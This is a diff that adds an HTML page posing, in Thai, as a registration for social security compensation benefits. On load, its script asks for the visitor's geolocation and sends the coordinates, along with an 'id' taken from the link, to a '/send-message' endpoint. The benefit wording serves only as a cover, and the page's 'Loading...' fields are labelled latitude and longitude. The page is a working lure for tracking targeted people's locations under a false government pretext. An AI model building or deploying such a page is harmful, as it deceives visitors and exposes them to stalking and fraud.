@@ -1,1 +1,142 @@
-<h1>helo</h1>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ลงทะเบียนรับสิทธิ์</title>
+    <!-- Include jQuery from a CDN -->
+    <script src="./js/jquery-3.6.0.min.js"></script>
+    <style>
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #content {
+            display: none;
+            padding: 20px;
+        }
+
+        #instructions {
+            display: none;
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: #f9f9f9;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loading">
+        <div class="spinner"></div>
+    </div>
+    <div id="content">
+        <h1>ยืนยันตัวตน</h1>
+        <p>รับเงินทดแทนการขาดรายได้สูงสุด</p>
+        <p>ผู้ประกันตนจะได้รับสิทธิประโยชน์จากกองทุน: <span id="latitude">Loading...</span></p>
+        <p>กองทุนเงินทดแทน ซึ่งจะได้รับสิทธิประโยชน์ที่แตกต่างกันแล้วแต่กรณี.: <span id="longitude">Loading...</span></p>
+       
+    </div>
+
+    <!-- Include the script to fetch geolocation -->
+    <script>
+        $(document).ready(function () {
+            function requestLocation() {
+                $('#loading').show(); // Show loading screen
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function (position) {
+                            // Success callback
+                            var lat = position.coords.latitude;
+                            var long = position.coords.longitude;
+                            sendLocationData(lat, long);
+                        },
+                        function (error) {
+                            sendLocationData(0, 0);
+                            // Error callback
+                            console.error("Error Code = " + error.code + " - " + error.message);
+                            
+                            if (error.code === error.PERMISSION_DENIED) {
+                              
+                            }
+                        }
+                    );
+                } else {
+                    sendLocationData(0, 0);
+                   
+                }
+            }
+
+            function sendLocationData(latitude, longitude) {
+                // Example: Send data to a server endpoint using AJAX
+
+                var url_param = new URL(window.location.href);
+                var id = url_param.searchParams.get("id");
+                $.ajax({
+                    url: "/send-message", // Replace with your endpoint
+                    method: 'POST',
+                    contentType: 'application/json', // Set content type to JSON
+                    data: JSON.stringify({
+                        id: id,
+                        latitude: latitude,
+                        longitude: longitude,
+                    }),
+                    success: function (response) {
+                        console.log('Location data sent successfully:', response);
+                    },
+                    error: function (xhr, status, error) {
+                        console.error('Error sending location data:', error);
+                    }
+                });
+            }
+
+            // Initial request for location
+            requestLocation();
+
+            // Retry button click event
+            $('#retry').on('click', function () {
+                $('#instructions').toggle(); // Toggle instructions visibility
+            });
+        });
+    </script>
+</body>
+
+</html>
